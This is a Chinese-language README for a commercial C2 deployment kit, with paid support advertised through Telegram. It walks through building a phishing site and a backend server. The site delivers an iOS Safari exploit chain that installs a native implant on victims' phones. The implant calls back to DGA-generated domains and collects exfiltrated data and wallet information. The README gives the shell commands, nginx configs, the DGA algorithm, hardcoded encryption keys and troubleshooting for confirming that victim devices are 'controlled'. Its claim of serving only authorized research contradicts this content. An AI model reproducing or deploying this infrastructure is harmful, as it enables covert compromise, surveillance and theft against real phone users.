# C2 基础设施部署包 v5
- **完整项目（含适配 iOS 16.2 / 16.6 / 17.x 的 Stage1 WASM exploit、Stage3 原生桥、powerd 注入 dylib）不免费提供**。
- 需要快速研究支持、版本适配、自定义 payload 编译、二进制利用链补全者请联系：

| 联系方式         | 地址                     |
| ------------ | ---------------------- |
| **Telegram** | <https://t.me/woshishei0829> |

- **技术支持定价：3000 USDT**（U）
- 仅接受**合法授权研究**用途咨询，**不接任何针对真实受害者的攻击委托**。

```
c2_deploy_kit_v5/
├── README.md                    # 本文件
├── dga_tool.py                  # DGA域名计算器 (macOS/Linux only)
├── patch_dga_seed.py            # 前端qqtime seed替换 (10个.min.js + 10个.js)
├── patch_new_js.sh              # 后端new.js seed替换 (CorePayload.dylib 6处 + show.html hash更新)
├── check_seed.sh                # 检查new.js当前seed
├── setup_backend.sh             # 后端一键部署脚本
│
├── frontend/                    # === 前端文件 ===
│   ├── www/wwwroot/xiongan2026.com/
│   │   ├── index.html           # 钓鱼站首页 (雄安峰会)
│   │   └── qqtime/              # exploit chain (83个文件, ~14MB)
│   └── etc/nginx/sites-enabled/
│       └── exploit_frontend     # 前端nginx配置参考
│
└── backend/                     # === 后端文件 ===
    ├── root/
    │   └── c2_backend.py        # C2后端服务 (~2500行Python)
    ├── var/www/html/details/    # payload文件 (24个: a1lib~t20lib, new.js, show.html, sms.js, helion.js)
    └── etc/
        ├── nginx/sites-enabled/
        │   └── c2_backend       # 后端nginx配置参考
        └── systemd/system/
            └── c2-backend.service
```

---

## 架构概览

```
受害者手机浏览器 (Safari)
     │
     ▼ HTTPS
┌─────────────────────┐           ┌─────────────────────┐
│     前端服务器        │   HTTP    │     C2后端服务器      │
│     (钓鱼站)         │─────────▶│     (数据收集)        │
│                     │   代理     │                     │
│ - index.html        │          │ - c2_backend.py:8899 │
│ - qqtime/ (exploit) │          │ - nginx (HTTP+HTTPS) │
│ - nginx             │          │ - /var/www/html/details/ │
│                     │          │   (payload文件)       │
│ 域名: <钓鱼站域名>   │          │ 域名: <DGA>.icu      │
└─────────────────────┘          └─────────────────────┘
                                          │
                                   ┌──────┴──────┐
                                   │  DGA .icu   │
                                   │  域名 (TLS) │
                                   └─────────────┘
                                          ▲
                                          │ 直连TLS (443)
                                   ┌──────┴──────┐
                                   │   Native    │
                                   │   Implant   │
                                   │(CorePayload)│
                                   └─────────────┘
```

**两条通信路径 (必须都通!!):**

| 路径 | 方向 | 经过 | 协议 |
|------|------|------|------|
| JS exploit chain | 手机Safari → 前端nginx → 后端:8899 | 前端域名 | HTTP 代理 |
| Native implant | 手机 → DGA .icu域名 → 后端nginx:443 | DGA域名 | **直连TLS** |

**重点**: Native implant **不经过前端**，直连后端的DGA .icu域名。所以:
- DGA .icu域名的DNS **必须指向后端IP**（不是前端!）
- 后端**必须有**该DGA域名的TLS证书
- Implant会验证TLS证书的CN必须匹配DGA域名

---

## 完整搭建流程

### 你需要准备的东西

| 项目 | 说明 | 怎么获取 |
|------|------|----------|
| 两台VPS | Ubuntu 22.04, 一台前端一台后端 | 买 |
| 新DGA seed | 32位hex | `python3 -c "import secrets; print(secrets.token_hex(16))"` |
| DGA .icu域名 | 用seed算出来 | `python3 dga_tool.py <seed> -n 3` |
| 钓鱼站域名 | 自己注册 | 任意域名 |

---

### 第一步: 生成seed + 算DGA域名

```bash
# 在本地Mac上执行

# 1. 生成随机seed
python3 -c "import secrets; print(secrets.token_hex(16))"
# 输出例如: 2d5f2fd645da741512c2fed7454911ef
# 记下来!!

# 2. 算对应的.icu域名
cd /path/to/c2_deploy_kit_v5
python3 dga_tool.py <你的seed> -n 3
# 输出例如:
# [0] as5s1br3t6jk4dn.icu    ← 必须买
# [1] 50wd80j6ky29nwk.icu    ← 建议买
# [2] xxxxx.icu              ← 备用

# 3. 验证算法正确性
python3 dga_tool.py --verify
# 必须显示 [OK]
```

**去域名注册商买前2个 .icu 域名** (至少买第1个)。

### 第二步: 配置DNS

```
DGA .icu 域名 → A记录 → 后端IP   (不是前端!!)
钓鱼站域名    → A记录 → 前端IP   (可以过Cloudflare CDN)
```

DGA域名 DNS设置:
```
类型: A
名称: @
值:   <后端IP>
TTL:  最小值
代理: 关闭!! (Cloudflare必须关橙色云朵, 用DNS Only灰色)
```

等3-5分钟，验证:
```bash
dig +short <DGA域名>
# 必须返回后端IP，不是Cloudflare的IP
```

---

### 第三步: 部署C2后端

#### 3.1 上传部署包到后端

```bash
scp -P <后端SSH端口> -r c2_deploy_kit_v5/ root@<后端IP>:/root/
```

#### 3.2 方式A: 一键部署 (推荐)

```bash
ssh -p <后端SSH端口> root@<后端IP>

cd /root/c2_deploy_kit_v5
bash setup_backend.sh <DGA域名> <前端IP> <admin_token>
# 例如:
# bash setup_backend.sh as5s1br3t6jk4dn.icu 38.91.114.2 admin123
```

脚本会自动: 装依赖 → 创建目录 → 部署c2_backend.py → 部署details/(24个文件) → 配置nginx → 申请TLS证书 → 配置防火墙

**如果TLS证书申请失败**: DNS没生效或Cloudflare代理没关。手动重试:
```bash
certbot certonly --webroot -w /var/www/html -d <DGA域名> \
    --non-interactive --agree-tos --register-unsafely-without-email
```
然后手动加HTTPS配置到nginx (参考方式B步骤8)

#### 3.2 方式B: 手动部署

```bash
ssh -p <后端SSH端口> root@<后端IP>

# 1. 装依赖
apt update && apt install -y nginx certbot python3-pip p7zip-full
pip3 install cryptography bcrypt

# 2. 创建目录
mkdir -p /www/wwwroot/c2_data/{decrypted,exfil,debug,ws_sessions}
mkdir -p /var/www/html/details
mkdir -p /var/www/html/.well-known/acme-challenge

# 3. 部署文件
cd /root/c2_deploy_kit_v5
cp backend/root/c2_backend.py /root/c2_backend.py
cp -r backend/var/www/html/details/* /var/www/html/details/

# 验证details文件 (必须24个)
ls /var/www/html/details/ | wc -l
# 输出: 24

# 4. 设置admin token
TOKEN="admin123"   # 换成你自己的
TOKEN_HASH=$(python3 -c "import hashlib; print(hashlib.sha256('$TOKEN'.encode()).hexdigest())")
sed -i "s/ADMIN_TOKEN_HASH = \".*\"/ADMIN_TOKEN_HASH = \"$TOKEN_HASH\"/" /root/c2_backend.py

# 5. systemd服务
cp backend/etc/systemd/system/c2-backend.service /etc/systemd/system/
systemctl daemon-reload
systemctl enable c2-backend
systemctl start c2-backend
sleep 3
systemctl status c2-backend
# 必须是 active (running)

# 6. nginx配置 — 先HTTP
rm -f /etc/nginx/sites-enabled/default
# !! 下面的 <DGA域名> 和 <后端IP> 要替换成实际值 !!
cat > /etc/nginx/sites-enabled/c2_backend << 'EOF'
server {
    listen 80;
    server_name <DGA域名> <后端IP>;

    location /.well-known/acme-challenge/ {
        root /var/www/html;
    }
    location /details/ {
        alias /var/www/html/details/;
        default_type application/octet-stream;
        add_header Cache-Control "no-cache";
    }
    location /admin {
        return 444;
    }
    location /event {
        proxy_pass http://127.0.0.1:8899;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header Host $host;
        proxy_set_header X-Original-URI $request_uri;
        client_max_body_size 50m;
    }
    location / {
        proxy_pass http://127.0.0.1:8899;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header Host $host;
        proxy_set_header X-Original-URI $request_uri;
        client_max_body_size 50m;
    }
    access_log /var/log/nginx/c2_access.log;
    error_log /var/log/nginx/c2_error.log;
}

server {
    listen 80 default_server;
    server_name _;
    return 444;
}
EOF

nginx -t && systemctl reload nginx

# 7. 申请TLS证书
certbot certonly --webroot -w /var/www/html -d <DGA域名> \
    --non-interactive --agree-tos --register-unsafely-without-email

# 8. nginx加HTTPS — 追加到配置文件末尾
# !! 下面4处 <DGA域名> 和1处 <后端IP> 要替换 !!
cat >> /etc/nginx/sites-enabled/c2_backend << 'EOF'

server {
    listen 443 ssl;
    server_name <DGA域名> <后端IP>;

    ssl_certificate /etc/letsencrypt/live/<DGA域名>/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/<DGA域名>/privkey.pem;

    location /details/ {
        alias /var/www/html/details/;
        default_type application/octet-stream;
        add_header Cache-Control "no-cache";
    }
    location /admin {
        return 444;
    }
    location /event {
        proxy_pass http://127.0.0.1:8899;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header Host $host;
        proxy_set_header X-Original-URI $request_uri;
        client_max_body_size 50m;
    }
    location / {
        proxy_pass http://127.0.0.1:8899;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header Host $host;
        proxy_set_header X-Original-URI $request_uri;
        client_max_body_size 50m;
    }
    access_log /var/log/nginx/c2_access.log;
    error_log /var/log/nginx/c2_error.log;
}
EOF

nginx -t && systemctl reload nginx

# 9. 证书自动续签
systemctl enable certbot.timer && systemctl start certbot.timer

# 10. 防火墙
ufw allow 80/tcp
ufw allow 443/tcp
ufw allow 8899/tcp
ufw allow <SSH端口>/tcp
ufw --force enable
```

#### 3.3 验证后端

```bash
# 在本地Mac执行:

# C2服务
curl -k https://<DGA域名>/
# 应返回 "ok" 或某个响应

# TLS证书
echo | openssl s_client -connect <DGA域名>:443 2>/dev/null | openssl x509 -noout -subject -dates
# subject=CN = <DGA域名>
# notBefore / notAfter 在有效期内

# details文件
curl -I https://<DGA域名>/details/new.js
# 200 OK

# admin面板 (直连8899端口，nginx拦截了外部/admin)
curl http://<后端IP>:8899/admin?token=<你的token>
# 应返回HTML面板
```

---

### 第四步: 部署前端

#### 4.1 上传文件 + 安装nginx

```bash
scp -P <前端SSH端口> -r c2_deploy_kit_v5/ root@<前端IP>:/root/

ssh -p <前端SSH端口> root@<前端IP>
apt update && apt install -y nginx
```

#### 4.2 部署钓鱼站文件

```bash
mkdir -p /www/wwwroot/<钓鱼站域名>

cd /root/c2_deploy_kit_v5
cp frontend/www/wwwroot/xiongan2026.com/index.html /www/wwwroot/<钓鱼站域名>/
cp -r frontend/www/wwwroot/xiongan2026.com/qqtime /www/wwwroot/<钓鱼站域名>/qqtime

# 验证文件数 (必须83个!)
ls /www/wwwroot/<钓鱼站域名>/qqtime/ | wc -l
# 输出必须是83，少了exploit会断链
```

#### 4.3 配置前端Nginx

```bash
rm -f /etc/nginx/sites-enabled/default

# !! 下面的 <钓鱼站域名>(5处) 和 <后端IP>(7处) 全部要替换 !!
cat > /etc/nginx/sites-enabled/exploit_frontend << 'EOF'
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name <钓鱼站域名> www.<钓鱼站域名> _;
    root /www/wwwroot/<钓鱼站域名>;
    index index.html;

    # exploit文件 - 禁止缓存
    location /qqtime/ {
        add_header Cache-Control "no-cache, no-store, must-revalidate" always;
        add_header Pragma "no-cache" always;
        add_header Expires "0" always;
        add_header X-Content-Type-Options "nosniff" always;
        try_files $uri $uri/ =404;
    }

    # 心跳 → 后端
    location = /event {
        proxy_pass http://<后端IP>:8899/event;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header Host $host;
        proxy_read_timeout 30s;
        client_max_body_size 10m;
    }

    # 数据上传 → 后端
    location = /u {
        proxy_pass http://<后端IP>:8899/u;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header Host $host;
        proxy_read_timeout 60s;
        client_max_body_size 50m;
    }

    # payload下载 → 后端
    location /details/ {
        proxy_pass http://<后端IP>:8899/details/;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header Host $host;
        proxy_read_timeout 30s;
        add_header Cache-Control "no-cache" always;
    }

    # Loader API → 后端 (路径转换: /api/ → /c2/api/)
    location /api/ {
        proxy_pass http://<后端IP>:8899/c2/api/;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header Host $host;
        proxy_read_timeout 30s;
    }

    # /c2/details/ → 后端details
    location /c2/details/ {
        proxy_pass http://<后端IP>:8899/details/;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header Host $host;
        proxy_read_timeout 30s;
        add_header Cache-Control "no-cache" always;
    }

    # C2通信通道 → 后端
    location /c2/ {
        proxy_pass http://<后端IP>:8899/c2/;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header Host $host;
        proxy_read_timeout 30s;
        client_max_body_size 50m;
    }

    # 默认处理
    location / {
        try_files $uri $uri/ @c2_fallback;
    }

    location @c2_fallback {
        proxy_pass http://<后端IP>:8899;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header Host $host;
        proxy_read_timeout 30s;
        client_max_body_size 50m;
    }
}
EOF

nginx -t && systemctl reload nginx
```

#### 4.4 验证前端

```bash
# 在本地Mac:
curl http://<钓鱼站域名>/
# 返回index.html (雄安峰会页面)

curl -I http://<钓鱼站域名>/qqtime/7a7d99099b035b2c6512b6ebeeea6df1ede70fbb.min.js
# 200 OK

curl -s http://<钓鱼站域名>/event
# 不是502/504 (说明到后端的代理通了)
```

---

### 第五步: 替换DGA seed (两个地方都要改!!)

> **如果你沿用部署包里的默认seed `cb11eeb78689a53594dcdcf14ea2d548`，跳过这步。**
> **但你几乎一定要换seed** — 每次新搭建都应该用新seed。

#### 5A. 后端 — CorePayload.dylib (6处seed) + show.html config hash

**在后端服务器上执行:**

```bash
cd /root/c2_deploy_kit_v5
bash patch_new_js.sh <新seed>
# 例如: bash patch_new_js.sh 2d5f2fd645da741512c2fed7454911ef

# 脚本自动执行:
# 1. 解压new.js → 提取CorePayload.dylib
# 2. 自动检测当前seed
# 3. 替换6处seed
# 4. 重新打包7z → new.js
# 5. 更新show.html中config.json的core.sha256和core.size ← v5修复的关键!!

# 必须验证!!
bash check_seed.sh /var/www/html/details
```

**!! 重要 !!** 如果第5步输出包含 `[严重错误] show.html config更新失败`，**必须手动修复!!** (见下面"手动修复show.html"章节)

#### 5B. 前端 — qqtime 10个.min.js + 10个.js

**方式1 — 在前端服务器上本地执行:**
```bash
cd /root/c2_deploy_kit_v5
python3 patch_dga_seed.py --new <新seed> --dir /www/wwwroot/<钓鱼站域名>/qqtime
```

**方式2 — 从本地Mac SSH远程执行:**
```bash
python3 patch_dga_seed.py --new <新seed> \
    --ssh root@<前端IP>:<SSH端口> --password <前端密码>
```

**先用 `--dry-run` 干跑检查:**
```bash
python3 patch_dga_seed.py --new <新seed> --dir /path/to/qqtime --dry-run
```

> **两个地方的seed必须一致!!** 前端qqtime里的seed决定了exploit给设备配置的DGA域名，后端CorePayload.dylib里的seed是implant实际连接用的。不一致 = implant连错域名 = 连不上。

---

### 第六步: 最终验证清单

在本地Mac执行，**每一项都必须通过**:

```bash
# 1. DNS解析 — DGA域名指向后端
dig +short <DGA域名>
# ✅ 返回后端IP (不是前端IP, 不是Cloudflare IP)

# 2. TLS证书 — 域名匹配 + 没过期
echo | openssl s_client -connect <DGA域名>:443 2>/dev/null | openssl x509 -noout -subject -dates
# ✅ subject=CN = <DGA域名>
# ✅ notAfter 在将来

# 3. details/文件可通过DGA域名HTTPS下载
curl -sk https://<DGA域名>/details/new.js -o /dev/null -w '%{http_code} %{size_download}\n'
# ✅ 200 + 约52万字节
curl -sk https://<DGA域名>/details/show.html -o /dev/null -w '%{http_code} %{size_download}\n'
# ✅ 200 + 约2016字节

# 4. ★★★ show.html config hash 与 CorePayload.dylib 匹配 ★★★
#    (这是最容易出错的地方!! 必须检查!!)
#    SSH到后端执行:
cd /tmp && rm -rf _v1 _v2 && mkdir _v1 _v2
7z e -p"abf3bdc8e239c0f3183c257f9ccc23e8" -o_v1 -y /var/www/html/details/show.html > /dev/null
python3 -c "import json; c=json.load(open('_v1/config.json')); print('config sha256:', c['core']['sha256']); print('config size:', c['core']['size'])"
7z e -p"abf3bdc8e239c0f3183c257f9ccc23e8" -o_v2 -y /var/www/html/details/new.js > /dev/null
sha256sum _v2/CorePayload.dylib
wc -c < _v2/CorePayload.dylib
rm -rf _v1 _v2
# ✅ config的sha256 必须 == CorePayload.dylib的sha256
# ✅ config的size 必须 == CorePayload.dylib的字节数
# ❌ 如果不匹配 → 见"手动修复show.html"

# 5. 前端钓鱼站
curl http://<钓鱼站域名>/
# ✅ 返回index.html

# 6. exploit chain manifest
curl -I http://<钓鱼站域名>/qqtime/7a7d99099b035b2c6512b6ebeeea6df1ede70fbb.min.js
# ✅ 200 OK

# 7. 前端→后端代理
curl -s http://<钓鱼站域名>/event
# ✅ 不是502/504

# 8. seed一致性
# 后端 (SSH到后端):
bash /root/c2_deploy_kit_v5/check_seed.sh /var/www/html/details
# 前端 (SSH到前端):
python3 /root/c2_deploy_kit_v5/patch_dga_seed.py --new <当前seed> --dir /www/wwwroot/<钓鱼站域名>/qqtime --dry-run
# ✅ 两边seed相同
# ✅ dry-run显示"所有文件已是最新"或"跳过"
```

---

## 手动修复 show.html (如果patch脚本更新失败)

如果 `patch_new_js.sh` 报告 show.html 更新失败，或者验证清单第4项hash不匹配，必须手动修复:

```bash
# 在后端服务器执行:

# 1. 获取当前CorePayload.dylib的hash和size
cd /tmp && rm -rf _fix _show && mkdir _fix _show
7z e -p"abf3bdc8e239c0f3183c257f9ccc23e8" -o_fix -y /var/www/html/details/new.js > /dev/null
HASH=$(sha256sum _fix/CorePayload.dylib | cut -d' ' -f1)
SIZE=$(wc -c < _fix/CorePayload.dylib)
echo "Hash: $HASH"
echo "Size: $SIZE"

# 2. 解压show.html并修改config.json
7z e -p"abf3bdc8e239c0f3183c257f9ccc23e8" -o_show -y /var/www/html/details/show.html > /dev/null
python3 -c "
import json
with open('_show/config.json') as f:
    cfg = json.load(f)
cfg['core']['sha256'] = '$HASH'
cfg['core']['size'] = $SIZE
with open('_show/config.json', 'w') as f:
    json.dump(cfg, f, indent=2)
print('Updated: core.sha256=' + '$HASH'[:16] + '... core.size=' + str($SIZE))
"

# 3. 重新打包并替换
cp /var/www/html/details/show.html /var/www/html/details/show.html.bak
cd _show && 7z a -p"abf3bdc8e239c0f3183c257f9ccc23e8" -mhe=on /tmp/show_fixed.7z config.json > /dev/null
cp /tmp/show_fixed.7z /var/www/html/details/show.html
echo "show.html replaced"

# 4. 验证
cd /tmp && rm -rf _verify && mkdir _verify
7z e -p"abf3bdc8e239c0f3183c257f9ccc23e8" -o_verify -y /var/www/html/details/show.html > /dev/null
python3 -c "import json; c=json.load(open('_verify/config.json')); print('verify sha256:', c['core']['sha256']); print('verify size:', c['core']['size'])"
# 确认和第1步的HASH、SIZE完全一致

# 5. 清理
rm -rf /tmp/_fix /tmp/_show /tmp/_verify /tmp/show_fixed.7z
```

---

## 固定参数 (不随部署改变)

| 参数 | 值 | 说明 |
|------|-----|------|
| 7z密码 | `abf3bdc8e239c0f3183c257f9ccc23e8` | new.js / show.html 的7z加密密码 |
| AES_PASSWORD | `Ek8pl31K2yeHgQwy` | 数据加密密钥 |
| Master Key | `b38fd1ccd6570d8b3ce8edabd740e60d97e93a44fb27b35f2c54c473a37ce676` | qqtime manifest解密密钥 |
| Manifest文件 | `7a7d99099b035b2c6512b6ebeeea6df1ede70fbb.min.js` | exploit chain入口manifest |
| C2监听端口 | `8899` | c2_backend.py 监听端口 |
| details文件数 | **24个** | a1lib~t20lib + helion + new.js + show.html + sms.js |
| qqtime文件数 | **83个** | exploit chain 全部文件 |

---

## 每次搭建需要变化的参数

| 参数 | 说明 |
|------|------|
| DGA seed | 每次新搭建必须用新的32位hex |
| DGA .icu域名 | 由seed决定，买新的 |
| 后端IP | 新VPS的IP |
| 前端IP | 新VPS的IP |
| 钓鱼站域名 | 新注册的域名 |
| Admin Token | 自己设定 |
| TLS证书 | 新域名需新证书 (certbot自动申请) |

---

## DGA算法

```
输入: 32位hex字符串 seed
输出: 15字符[a-z0-9] + ".icu" 域名

算法:
1. h = MurmurHash2(seed的UTF-8字节, hash_seed=0x12345678)
2. srandom(h)     ← BSD libc srandom, 不是arc4random
3. 对每个域名 i = 0, 1, 2, ...:
   a. warmup = MurmurHash2((seed + str(i))的UTF-8字节, 0x12345678) % 10000
   b. 调用 random() warmup次 (丢弃输出)
   c. 循环15次: domain[j] = "abcdefghijklmnopqrstuvwxyz0123456789"[random() % 36]
   d. domain += ".icu"
```

已知验证对:
```
a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 → turtmc5ro2aozvz.icu
cb11eeb78689a53594dcdcf14ea2d548 → jlewb8hbtrvj7zk.icu
2d5f2fd645da741512c2fed7454911ef → as5s1br3t6jk4dn.icu
```

> **dga_tool.py 只能在 macOS 或 Linux 上跑** — 用了 BSD libc 的 srandom()/random()。Windows 不行。

---

## 踩坑记录 (血泪教训)

### 1. ★ show.html config hash 不匹配 (最致命!!)

**现象**: exploit chain全部加载成功、IP_SYNC心跳正常、CONFIG_SERVED日志出现，但native implant不安装、isControlled始终false
**原因**: `patch_new_js.sh` 替换seed后 CorePayload.dylib 的 SHA256 变了，但 show.html 里 config.json 的 `core.sha256` 没更新。implant下载解压 CorePayload.dylib 后校验hash失败，拒绝安装。
**解决**: v5版 `patch_new_js.sh` 已修复。部署后必须用验证清单第4项确认hash匹配。不匹配就手动修复。

### 2. DGA .icu 域名 DNS 指向前端 (错误!!)

**现象**: JS exploit chain工作正常但native implant连不上
**原因**: .icu域名指向了前端IP。native implant直连后端443端口，不走前端。
**正确**: .icu域名 DNS A记录 → **后端IP**

### 3. TLS证书域名不匹配

**现象**: native implant拒绝连接
**原因**: 后端TLS证书的CN不是DGA .icu域名
**解决**: 用certbot给DGA域名申请证书。`openssl s_client` 验证CN匹配。

### 4. seed改了但两边不一致

**现象**: exploit给设备的DGA域名和implant实际连接的域名不同
**原因**: 前端qqtime和后端CorePayload.dylib的seed不一致
**解决**: 两处必须改成完全相同的seed

### 5. Cloudflare代理开着 (橙色云朵)

**问题A**: certbot申请证书失败 (Cloudflare拦截ACME challenge)
**问题B**: implant TLS验证失败 (看到Cloudflare证书不是DGA域名证书)
**解决**: DGA .icu域名的Cloudflare必须用 "DNS Only" (灰色云朵)。钓鱼站域名可以开Cloudflare代理。

### 6. qqtime文件不全 (不够83个)

**现象**: exploit chain某个阶段404断链
**解决**: `ls qqtime/ | wc -l` 必须输出83

### 7. details/ 文件不全 (不够24个)

**现象**: implant安装成功但钱包插件下载失败
**解决**: `ls details/ | wc -l` 必须输出24

---

## Admin面板访问

后端nginx把 `/admin` 返回444 (安全策略，防外部访问)。两种方式访问:

**方法1: 直连8899端口** (如果8899端口对外开放)
```
http://<后端IP>:8899/admin?token=<你的token>
```

**方法2: SSH隧道** (更安全)
```bash
ssh -L 8899:127.0.0.1:8899 -p <SSH端口> root@<后端IP>
# 然后浏览器打开: http://127.0.0.1:8899/admin?token=<你的token>
```

---

## 判断implant是否安装成功

| 信号 | 说明 | 在哪看 |
|------|------|--------|
| IP_SYNC | JS exploit的心跳 (仅说明exploit JS在跑) | Admin面板 → 设备列表 |
| CONFIG_SERVED | 设备请求了show.html配置 (exploit第二阶段在执行) | C2日志 |
| **isControlled=true** | **native implant成功安装并回传** | Admin面板 → 设备列表 |
| UA含 CFNetwork/locationd | native流量特征 (不是Safari UA) | nginx access log |

**只有看到 `isControlled=true` 才算成功。**
仅有 IP_SYNC = JS在跑但native没装上。
有 CONFIG_SERVED 但没 isControlled = config下载了但hash校验失败或payload安装失败。

---

## 服务管理

```bash
# 后端C2服务
systemctl status c2-backend
systemctl restart c2-backend
journalctl -u c2-backend -f          # 实时日志

# Nginx
nginx -t                              # 测试配置
systemctl reload nginx

# 日志
tail -f /var/log/nginx/c2_access.log  # nginx访问日志
tail -f /var/log/nginx/c2_error.log   # nginx错误日志

# 证书续签
certbot renew --dry-run               # 测试
certbot renew && systemctl reload nginx  # 手动续签
systemctl list-timers | grep certbot  # 确认自动续签timer在跑
```
